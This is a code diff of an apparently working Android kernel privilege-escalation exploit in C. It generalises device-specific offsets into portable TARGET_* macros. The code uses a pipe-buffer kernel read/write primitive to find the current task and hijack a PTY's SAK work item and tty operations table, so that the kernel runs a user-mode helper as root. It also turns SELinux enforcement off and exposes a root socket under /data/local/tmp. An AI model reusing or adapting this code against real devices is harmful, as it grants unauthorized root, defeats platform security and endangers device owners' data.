@@ -22,48 +22,12 @@
 #include "09_pipe_buffer_rw.h"
 #include "10_workqueue_umh_root.h"
 #include "90_diagnostic_checkpoint.h"
-#include "target_zzhl.h"
+#include "target.h"
 
-#define SELINUX_ENFORCING_OFF ZZHL_SELINUX_STATE_ENFORCING_OFF
-#define INIT_TASK_OFF ZZHL_INIT_TASK_OFF
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF \
-  ZZHL_CALL_USERMODEHELPER_EXEC_WORK_OFF
-#define DO_SAK_WORK_OFF ZZHL_DO_SAK_WORK_OFF
-#define DO_SAK_OFF ZZHL_DO_SAK_OFF
-
-#define TASK_TASKS_OFF ZZHL_TASK_TASKS_OFF
-#define TASK_PID_OFF ZZHL_TASK_PID_OFF
-#define TASK_FILES_OFF ZZHL_TASK_FILES_OFF
-#define FILES_FDT_OFF ZZHL_FILES_FDT_OFF
-#define FDTABLE_MAX_FDS_OFF ZZHL_FDTABLE_MAX_FDS_OFF
-#define FDTABLE_FD_OFF ZZHL_FDTABLE_FD_OFF
-#define FILE_PRIVATE_DATA_OFF ZZHL_FILE_PRIVATE_DATA_OFF
-#define TTY_FILE_TTY_OFF ZZHL_TTY_FILE_TTY_OFF
-#define TTY_FILE_FILE_OFF ZZHL_TTY_FILE_FILE_OFF
-
-#define TTY_MAGIC_OFF ZZHL_TTY_MAGIC_OFF
-#define TTY_OPS_OFF ZZHL_TTY_OPS_OFF
-#define TTY_INDEX_OFF ZZHL_TTY_INDEX_OFF
-#define TTY_SAK_WORK_OFF ZZHL_TTY_SAK_WORK_OFF
-#define TTY_PORT_OFF ZZHL_TTY_PORT_OFF
-#define TTY_MAGIC 0x5401U
-#define TTY_OPS_SIZE ZZHL_TTY_OPS_SIZE
-#define TTY_OPS_FLUSH_BUFFER_OFF ZZHL_TTY_OPS_FLUSH_BUFFER_OFF
-
-#define WORK_DATA_OFF ZZHL_WORK_DATA_OFF
-#define WORK_ENTRY_OFF ZZHL_WORK_ENTRY_OFF
-#define WORK_FUNC_OFF ZZHL_WORK_FUNC_OFF
-#define WORK_PENDING_BIT 0x1ULL
-
-#define ROOT_UMH_DATA_OFF 0x6200ULL
-#define ROOT_TTY_OPS_OFF 0x6400ULL
-#define DIRECT_MAP_BASE 0xffffff8000000000ULL
-#define DIRECT_MAP_END 0xffffff9000000000ULL
-#define KERNEL_IMAGE_SPAN 0x04000000ULL
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
 
 struct umh_subprocess_info {
-  uint8_t work[48];
+  uint8_t work[TARGET_UMH_SUBPROCESS_WORK_SIZE];
   uint64_t complete;
   uint64_t path;
   uint64_t argv;
@@ -105,29 +69,33 @@ struct tty_kernel_object {
   uint64_t tty;
   uint64_t original_ops;
   uint8_t original_tail[sizeof(struct umh_subprocess_info)];
-  uint8_t original_ops_table[TTY_OPS_SIZE];
+  uint8_t original_ops_table[TARGET_TTY_OPS_SIZE];
 };
 
-_Static_assert(sizeof(struct umh_subprocess_info) == 112,
+_Static_assert(sizeof(struct umh_subprocess_info) ==
+                   TARGET_UMH_SUBPROCESS_INFO_SIZE,
                "subprocess_info layout");
-_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");
-_Static_assert(offsetof(struct umh_subprocess_info, complete) == 48,
+_Static_assert(sizeof(struct umh_completion) == TARGET_UMH_COMPLETION_SIZE,
+               "completion layout");
+_Static_assert(offsetof(struct umh_subprocess_info, complete) ==
+                   TARGET_UMH_SUBPROCESS_COMPLETE_OFF,
                "subprocess_info complete offset");
 
 static int is_direct_ptr(uint64_t value) {
-  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
+  return value >= TARGET_LINEAR_MAP_BASE && value < TARGET_LINEAR_MAP_END;
 }
 
 static int is_kernel_image_ptr(uint64_t value, uint64_t kernel_base) {
-  return value >= kernel_base && value < kernel_base + KERNEL_IMAGE_SPAN;
+  return value >= kernel_base && value < kernel_base + TARGET_KERNEL_IMAGE_SPAN;
 }
 
 static int kernel_image_linear_alias(uint64_t target_addr,
                                      uint64_t memstart_addr,
                                      uint64_t kimage_voffset,
                                      uint64_t *linear_alias) {
-  if (!linear_alias || (memstart_addr & 0xfffULL) != 0 ||
-      (kimage_voffset & 0xfffULL) != 0 || target_addr < kimage_voffset) {
+  if (!linear_alias || (memstart_addr & TARGET_PAGE_MASK) != 0 ||
+      (kimage_voffset & TARGET_PAGE_MASK) != 0 ||
+      target_addr < kimage_voffset) {
     return 0;
   }
   uint64_t physical = target_addr - kimage_voffset;
@@ -135,10 +103,10 @@ static int kernel_image_linear_alias(uint64_t target_addr,
     return 0;
   }
   uint64_t linear_offset = physical - memstart_addr;
-  if (linear_offset >= ZZHL_LINEAR_MAP_END - ZZHL_LINEAR_MAP_BASE) {
+  if (linear_offset >= TARGET_LINEAR_MAP_END - TARGET_LINEAR_MAP_BASE) {
     return 0;
   }
-  *linear_alias = ZZHL_LINEAR_MAP_BASE + linear_offset;
+  *linear_alias = TARGET_LINEAR_MAP_BASE + linear_offset;
   return 1;
 }
 
@@ -200,7 +168,7 @@ static int root_socket_ready(void) {
 static uint64_t find_current_task(int fd, uint64_t kernel_base,
                                   uint64_t memstart_addr,
                                   uint64_t kimage_voffset) {
-  uint64_t list_head = kernel_base + INIT_TASK_OFF + TASK_TASKS_OFF;
+  uint64_t list_head = kernel_base + TARGET_INIT_TASK_OFF + TARGET_TASK_TASKS_OFF;
   uint64_t list_previous_alias = 0;
   uint64_t node = 0;
   if (!kernel_image_linear_alias(list_head + sizeof(uint64_t), memstart_addr,
@@ -211,11 +179,11 @@ static uint64_t find_current_task(int fd, uint64_t kernel_base,
   pid_t wanted = getpid();
   for (int walked = 0; walked < 16384; walked++) {
     if (!is_direct_ptr(node) || node == list_head) break;
-    uint64_t task = node - TASK_TASKS_OFF;
+    uint64_t task = node - TARGET_TASK_TASKS_OFF;
     uint32_t pid = 0;
     uint64_t previous = 0;
-    if (!pipe_read32(fd, task + TASK_PID_OFF, &pid) ||
-        !pipe_read64(fd, task + TASK_TASKS_OFF + sizeof(uint64_t), &previous)) {
+    if (!pipe_read32(fd, task + TARGET_TASK_PID_OFF, &pid) ||
+        !pipe_read64(fd, task + TARGET_TASK_TASKS_OFF + sizeof(uint64_t), &previous)) {
       break;
     }
     if ((pid_t)pid == wanted) return task;
@@ -233,20 +201,20 @@ static int resolve_tty_object(int fd, uint64_t kernel_base,
                                     kimage_voffset);
   uint64_t files = 0, fdt = 0, fd_array = 0;
   uint32_t max_fds = 0;
-  if (!task || !pipe_read64(fd, task + TASK_FILES_OFF, &files) ||
-      !is_direct_ptr(files) || !pipe_read64(fd, files + FILES_FDT_OFF, &fdt) ||
+  if (!task || !pipe_read64(fd, task + TARGET_TASK_FILES_OFF, &files) ||
+      !is_direct_ptr(files) || !pipe_read64(fd, files + TARGET_FILES_FDT_OFF, &fdt) ||
       !is_direct_ptr(fdt) ||
-      !pipe_read32(fd, fdt + FDTABLE_MAX_FDS_OFF, &max_fds) ||
+      !pipe_read32(fd, fdt + TARGET_FDTABLE_MAX_FDS_OFF, &max_fds) ||
       tty_fd < 0 || (uint32_t)tty_fd >= max_fds ||
-      !pipe_read64(fd, fdt + FDTABLE_FD_OFF, &fd_array) ||
+      !pipe_read64(fd, fdt + TARGET_FDTABLE_FD_OFF, &fd_array) ||
       !is_direct_ptr(fd_array) ||
       !pipe_read64(fd, fd_array + (uint64_t)tty_fd * sizeof(uint64_t),
                    &object->file) ||
       !is_direct_ptr(object->file) ||
-      !pipe_read64(fd, object->file + FILE_PRIVATE_DATA_OFF,
+      !pipe_read64(fd, object->file + TARGET_FILE_PRIVATE_DATA_OFF,
                    &object->private_data) ||
       !is_direct_ptr(object->private_data) ||
-      !pipe_read64(fd, object->private_data + TTY_FILE_TTY_OFF, &object->tty) ||
+      !pipe_read64(fd, object->private_data + TARGET_TTY_FILE_TTY_OFF, &object->tty) ||
       !is_direct_ptr(object->tty)) {
     return 0;
   }
@@ -255,19 +223,19 @@ static int resolve_tty_object(int fd, uint64_t kernel_base,
   uint64_t original_ops_alias = 0;
   uint32_t magic = 0, index = 0;
   uint64_t port = 0;
-  if (!pipe_read64(fd, object->private_data + TTY_FILE_FILE_OFF,
+  if (!pipe_read64(fd, object->private_data + TARGET_TTY_FILE_FILE_OFF,
                    &private_file) ||
       private_file != object->file ||
-      !pipe_read32(fd, object->tty + TTY_MAGIC_OFF, &magic) ||
-      magic != TTY_MAGIC ||
-      !pipe_read32(fd, object->tty + TTY_INDEX_OFF, &index) || index > 4095 ||
-      !pipe_read64(fd, object->tty + TTY_OPS_OFF, &object->original_ops) ||
+      !pipe_read32(fd, object->tty + TARGET_TTY_MAGIC_OFF, &magic) ||
+      magic != TARGET_TTY_MAGIC ||
+      !pipe_read32(fd, object->tty + TARGET_TTY_INDEX_OFF, &index) || index > 4095 ||
+      !pipe_read64(fd, object->tty + TARGET_TTY_OPS_OFF, &object->original_ops) ||
       !is_kernel_image_ptr(object->original_ops, kernel_base) ||
       !kernel_image_linear_alias(object->original_ops, memstart_addr,
                                  kimage_voffset, &original_ops_alias) ||
-      !pipe_read64(fd, object->tty + TTY_PORT_OFF, &port) ||
+      !pipe_read64(fd, object->tty + TARGET_TTY_PORT_OFF, &port) ||
       !is_direct_ptr(port) ||
-      !oss_pipe_rw_read(fd, object->tty + TTY_SAK_WORK_OFF,
+      !oss_pipe_rw_read(fd, object->tty + TARGET_TTY_SAK_WORK_OFF,
                         object->original_tail,
                         sizeof(object->original_tail)) ||
       !oss_pipe_rw_read(fd, original_ops_alias, object->original_ops_table,
@@ -275,15 +243,15 @@ static int resolve_tty_object(int fd, uint64_t kernel_base,
     return 0;
   }
 
-  uint64_t work_addr = object->tty + TTY_SAK_WORK_OFF;
-  uint64_t entry_addr = work_addr + WORK_ENTRY_OFF;
-  uint64_t work_data = load_u64(object->original_tail, WORK_DATA_OFF);
-  uint64_t entry_next = load_u64(object->original_tail, WORK_ENTRY_OFF);
+  uint64_t work_addr = object->tty + TARGET_TTY_SAK_WORK_OFF;
+  uint64_t entry_addr = work_addr + TARGET_WORK_ENTRY_OFF;
+  uint64_t work_data = load_u64(object->original_tail, TARGET_WORK_DATA_OFF);
+  uint64_t entry_next = load_u64(object->original_tail, TARGET_WORK_ENTRY_OFF);
   uint64_t entry_prev =
-      load_u64(object->original_tail, WORK_ENTRY_OFF + sizeof(uint64_t));
-  uint64_t work_func = load_u64(object->original_tail, WORK_FUNC_OFF);
-  if ((work_data & WORK_PENDING_BIT) != 0 || entry_next != entry_addr ||
-      entry_prev != entry_addr || work_func != kernel_base + DO_SAK_WORK_OFF) {
+      load_u64(object->original_tail, TARGET_WORK_ENTRY_OFF + sizeof(uint64_t));
+  uint64_t work_func = load_u64(object->original_tail, TARGET_WORK_FUNC_OFF);
+  if ((work_data & TARGET_WORK_PENDING_BIT) != 0 || entry_next != entry_addr ||
+      entry_prev != entry_addr || work_func != kernel_base + TARGET_DO_SAK_WORK_OFF) {
     fprintf(stderr,
             "[root_umh] private PTY SAK work rejected data=%016llx "
             "entry=%016llx/%016llx func=%016llx\n",
@@ -298,11 +266,11 @@ static int restore_tty_object(int fd, const struct tty_kernel_object *object,
                               int restore_ops, int restore_tail) {
   int ok = 1;
   if (restore_ops &&
-      !pipe_write64(fd, object->tty + TTY_OPS_OFF, object->original_ops)) {
+      !pipe_write64(fd, object->tty + TARGET_TTY_OPS_OFF, object->original_ops)) {
     ok = 0;
   }
   if (restore_tail &&
-      !oss_pipe_rw_write(fd, object->tty + TTY_SAK_WORK_OFF,
+      !oss_pipe_rw_write(fd, object->tty + TARGET_TTY_SAK_WORK_OFF,
                          object->original_tail,
                          sizeof(object->original_tail))) {
     ok = 0;
@@ -312,12 +280,12 @@ static int restore_tty_object(int fd, const struct tty_kernel_object *object,
   uint64_t ops = 0;
   uint8_t tail[sizeof(object->original_tail)];
   if (restore_ops &&
-      (!pipe_read64(fd, object->tty + TTY_OPS_OFF, &ops) ||
+      (!pipe_read64(fd, object->tty + TARGET_TTY_OPS_OFF, &ops) ||
        ops != object->original_ops)) {
     return 0;
   }
   if (restore_tail &&
-      (!oss_pipe_rw_read(fd, object->tty + TTY_SAK_WORK_OFF, tail,
+      (!oss_pipe_rw_read(fd, object->tty + TARGET_TTY_SAK_WORK_OFF, tail,
                          sizeof(tail)) ||
        memcmp(tail, object->original_tail, sizeof(tail)) != 0)) {
     return 0;
@@ -336,7 +304,7 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
   struct tty_kernel_object tty_object;
   struct umh_kernel_data umh_data;
   struct umh_subprocess_info fake;
-  uint8_t fake_ops[TTY_OPS_SIZE];
+  uint8_t fake_ops[TARGET_TTY_OPS_SIZE];
   uint8_t original_selinux = 1;
   int selinux_changed = 0;
   int ops_published = 0;
@@ -367,7 +335,7 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
   snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
   snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
 
-  uint64_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
+  uint64_t umh_data_addr = page_base + TARGET_ROOT_UMH_DATA_LIVE_OFF;
   uint64_t completion_addr =
       umh_data_addr + offsetof(struct umh_kernel_data, completion);
   uint64_t wait_list_addr =
@@ -386,8 +354,8 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
   umh_data.envp[0] = 0;
 
   memcpy(&fake, tty_object.original_tail, sizeof(fake));
-  store_u64(fake.work, WORK_FUNC_OFF,
-            kernel_base + CALL_USERMODEHELPER_EXEC_WORK_OFF);
+  store_u64(fake.work, TARGET_WORK_FUNC_OFF,
+            kernel_base + TARGET_CALL_USERMODEHELPER_EXEC_WORK_OFF);
   fake.complete = completion_addr;
   fake.path = path_addr;
   fake.argv = argv_addr;
@@ -399,10 +367,10 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
   fake.data = 0;
 
   memcpy(fake_ops, tty_object.original_ops_table, sizeof(fake_ops));
-  store_u64(fake_ops, TTY_OPS_FLUSH_BUFFER_OFF, kernel_base + DO_SAK_OFF);
+  store_u64(fake_ops, TARGET_TTY_OPS_FLUSH_BUFFER_OFF, kernel_base + TARGET_DO_SAK_OFF);
 
-  uint64_t fake_ops_addr = page_base + ROOT_TTY_OPS_OFF;
-  uint64_t selinux_addr = kernel_base + SELINUX_ENFORCING_OFF;
+  uint64_t fake_ops_addr = page_base + TARGET_ROOT_TTY_OPS_LIVE_OFF;
+  uint64_t selinux_addr = kernel_base + TARGET_SELINUX_STATE_ENFORCING_OFF;
   uint64_t selinux_alias = 0;
   if (!kernel_image_linear_alias(selinux_addr, memstart_addr, kimage_voffset,
                                  &selinux_alias)) {
@@ -451,13 +419,13 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
     __atomic_store_n(kernel_state, irreversible_state, __ATOMIC_RELEASE);
   }
   tail_published = 1;
-  if (!oss_pipe_rw_write(fd, tty_object.tty + TTY_SAK_WORK_OFF, &fake,
+  if (!oss_pipe_rw_write(fd, tty_object.tty + TARGET_TTY_SAK_WORK_OFF, &fake,
                          sizeof(fake))) {
     fprintf(stderr, "[root_umh] private PTY subprocess publish failed\n");
     goto out;
   }
   ops_published = 1;
-  if (!pipe_write64(fd, tty_object.tty + TTY_OPS_OFF, fake_ops_addr)) {
+  if (!pipe_write64(fd, tty_object.tty + TARGET_TTY_OPS_OFF, fake_ops_addr)) {
     fprintf(stderr, "[root_umh] private PTY ops publish failed\n");
     goto out;
   }
@@ -530,7 +498,7 @@ int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
           "tty=%016llx work=%016llx\n",
           complete_done, socket_ok, tail_restored,
           (unsigned long long)tty_object.tty,
-          (unsigned long long)(tty_object.tty + TTY_SAK_WORK_OFF));
+          (unsigned long long)(tty_object.tty + TARGET_TTY_SAK_WORK_OFF));
   result = socket_ok && tail_restored;
 
 out:
@@ -576,15 +544,15 @@ int root_umh_install(uint64_t kernel_base, uint64_t page_base,
     return 0;
   }
   uint64_t ashmem_misc_fops_addr =
-      kernel_base + ZZHL_ASHMEM_MISC_FOPS_OFF;
+      kernel_base + TARGET_ASHMEM_MISC_FOPS_OFF;
   int verified = oss_verify_kernel_access(fd, ashmem_misc_fops_addr, page_base);
   uint64_t memstart_addr = 0;
   uint64_t kimage_voffset = 0;
   int alias_inputs =
       verified &&
-      oss_kernel_read(fd, kernel_base + ZZHL_MEMSTART_ADDR_OFF,
+      oss_kernel_read(fd, kernel_base + TARGET_MEMSTART_ADDR_OFF,
                       &memstart_addr, sizeof(memstart_addr)) &&
-      oss_kernel_read(fd, kernel_base + ZZHL_KIMAGE_VOFFSET_OFF,
+      oss_kernel_read(fd, kernel_base + TARGET_KIMAGE_VOFFSET_OFF,
                       &kimage_voffset, sizeof(kimage_voffset));
   int pipe_ready = alias_inputs &&
                    oss_pipe_rw_install(fd, kernel_base, page_base);
